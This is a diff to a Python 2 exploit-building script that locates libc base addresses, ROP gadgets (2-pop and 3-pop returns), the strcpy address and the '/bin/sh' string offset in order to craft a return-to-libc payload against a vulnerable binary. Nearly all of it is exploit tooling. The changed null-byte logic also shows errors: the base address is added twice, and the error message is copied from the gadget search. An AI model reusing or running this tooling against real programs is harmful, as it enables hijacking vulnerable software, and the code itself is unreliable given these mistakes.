@@ -100,21 +100,22 @@ def find_library_base_addr(vuln_binary, library_path):
 
     cmd = "gdb --batch --command=./test.gdb --args "
     cmd = cmd + vuln_binary
-    cmd = cmd + " hello|grep " + library_path + "|head -1|awk '{print $1}'"
+    cmd = cmd + " hello|grep " + os.path.realpath(library_path) + "|head -1|awk '{print $1}'"
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     proc.wait()
     try:
         library_base_addr = int(proc.stdout.read(), 16)
-    except:
-    	print "Error finding library base address"
+    except Exception as e:
+    	print "Error finding library base address %s" %(str(e))
         return None
 
     os.remove("./test.gdb")
     return library_base_addr
 
 
-def find_null_byte(vuln_bin, libc_base_addr):
+def find_null_byte(vuln_bin, base_addr):
 
+    #print 'Binary = %s Base addr = 0x%x' %(vuln_bin, base_addr)
     cmd = "ldd "
     cmd = cmd + vuln_bin
     cmd = cmd + "|grep libc|awk '{print $3}'"
@@ -128,7 +129,7 @@ def find_null_byte(vuln_bin, libc_base_addr):
     proc.wait()
     bin_sh_offset = int(proc.stdout.read(), 16)
 
-    null_byte_location = libc_base_addr + bin_sh_offset + len("/bin/sh")
+    null_byte_location = base_addr + bin_sh_offset + len("/bin/sh")
     return null_byte_location
 
 
@@ -166,10 +167,8 @@ def find_3pop_ret(instr_list, ret_index):
             break
 		
     if found == True:
-        print 'Found 3 pop ret at address 0x%x' %(instr_list[temp_index].address)
         return instr_list[temp_index].address
     else:
-        print '3 pop gadget not found !'
         return None
 
 
@@ -191,10 +190,8 @@ def find_2pop_ret(instr_list, ret_index):
             break
 
     if found == True:
-        print 'Found 2 pop ret at address 0x%x: %s' %(instr_list[temp_index].address, instr_list[temp_index].mnemonic)
         return instr_list[temp_index].address
     else:
-        print '2 pop gadget not found !'
         return None
 	
 def find_inc_ret(instr_list, ret_index):
@@ -312,7 +309,7 @@ if __name__ == '__main__':
                 print '%s library not present !' %(entry)
                 exit(1)
 
-            base_addr = find_lib_base_addr(entry)
+            base_addr = find_library_base_addr(args.vuln_bin, entry)
             if base_addr == None:
                 print 'Unable to get base address for library %s' %(entry)
                 exit(1)
@@ -343,6 +340,7 @@ if __name__ == '__main__':
         result = find_2pop_ret(instr, ret)
         if result != None:
             pop_pop_ret_addr = result + entry[2]
+            print 'Found 2 pop ret at address 0x%x' %(pop_pop_ret_addr)
             break
 
     if pop_pop_ret_addr == None:
@@ -365,6 +363,7 @@ if __name__ == '__main__':
         result = find_3pop_ret(instr, ret)
         if result != None:
             pop_pop_pop_ret_addr = result + entry[2]
+            print 'Found 3 pop ret at address 0x%x' %(pop_pop_pop_ret_addr)
             break
 
     if pop_pop_pop_ret_addr == None:
@@ -383,17 +382,22 @@ if __name__ == '__main__':
         exit(6)
     print 'strcpy address = 0x%x' %(strcpy_addr)
 
-    libc_base_addr = find_libc_addr(args.vuln_bin)
-    if libc_base_addr == None:
-        print 'Unable to find libc base address !'
-        exit(7)
-    print 'libc base address = 0x%x' %(libc_base_addr)
 
-    null_byte = find_null_byte(args.vuln_bin, libc_base_addr)
+    null_byte = None
+    for entry in lib_list:
+        if len(entry) != 4:
+            print 'Inconsistent entry in library structure !'
+            exit(4)
+
+        result = find_null_byte(entry[3], entry[2])
+        if result != None:
+            null_byte = result + entry[2]
+            break
+
     if null_byte == None:
-        print 'Unable to find a NULL byte in libc !'
-        exit(8)
-    print 'Null byte present at 0x%x' %(null_byte)
+        print 'Unable to find gadget with 3 pops !'
+        exit(4)
+
 
     buf_addr = find_buff_addr(args.vuln_bin)
     if buf_addr == None:
